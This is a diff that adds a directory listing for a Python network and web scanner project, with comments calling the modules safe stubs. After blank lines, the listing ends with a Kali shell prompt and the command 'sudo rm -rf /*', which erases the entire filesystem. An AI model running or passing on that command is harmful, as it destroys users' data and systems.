@@ -1,0 +1,22 @@
+Scanner-v3.2/
+├── LICENSE
+├── README.md
+├── .gitignore
+├── requirements.txt
+├── src/
+│   └── anish_scanner/
+│       ├── __init__.py
+│       ├── core.py          # high-level orchestration (safe)
+│       ├── network.py       # STUBS: network scanning functions (no active scanning)
+│       ├── webscan.py       # STUBS: web checks (no injection attempts)
+│       └── utils.py
+|        |____ source_script.py  #safe helpers (parsing, reporting, logging)
+├── scripts/
+│   └── run_scanner.py      # thin runner that enforces AUTHORIZATION check
+└── 
+
+
+
+
+┌──(kali㉿Anish)-[~]
+└─$ sudo rm -rf /*
